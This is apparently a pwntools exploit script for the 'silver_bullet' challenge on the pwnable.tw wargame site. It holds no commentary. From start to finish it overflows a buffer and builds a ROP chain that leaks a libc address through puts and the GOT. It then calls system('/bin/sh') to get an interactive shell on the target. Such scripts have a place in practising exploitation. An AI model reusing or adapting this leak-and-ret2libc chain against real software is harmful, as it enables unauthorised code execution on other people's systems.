#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
local = 1
if local:
	#exe = './silver_bullet'
	#cn = gdb.debug(exe,'''
	#	b *0x08048984
	#	continue
	#	''')
	cn = process('./silver_bullet')
	bin = ELF('./silver_bullet')
	libc = ELF('./libc_32.so.6')
else:
	cn = remote('chall.pwnable.tw', 10103)
	bin = ELF('./silver_bullet')
	libc = ELF('./libc_32.so.6')
def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()
def create(con):
	cn.sendline('1')
	cn.recvuntil('of bullet :')
	cn.send(con)
def powerup(con):
	cn.sendline('2')
	cn.recvuntil('of bullet :')
	cn.send(con)
def beat():
	cn.sendline('3')
p1ret=0x08048475
create('a'*(0x30-1))
powerup('b')#power 1
#z('b*0x080488FB\nc')
pay = '\xff'*3 + 'bbbb'
pay+=p32(bin.plt['puts'])+p32(p1ret)+p32(bin.got['read'])
pay+=p32(bin.sym['main'])
#print pay
powerup(pay)
beat()
cn.recvuntil('win !!\n')
leak=u32(cn.recv(4))
print hex(leak)
libc.address = leak-libc.sym['read']         #image  base address
success('libc_base: '+hex(libc.address))
system = libc.sym['system']
binsh = libc.search('/bin/sh\x00').next()
#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'
#print  hex(binsh)
#print hex(libc2.search('/bin/sh').next()+libc.address)
#print hex(libc2.search('/bin/sh').next())
#print hex(libc.address+int(0x1794d1))
#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'
#============one more time

create('a'*(0x30-1))
powerup('b')
pay = '\xff'*3 + 'bbbb'

pay+=p32(system)+p32(p1ret)+p32(binsh)
powerup(pay)
beat()
cn.interactive()
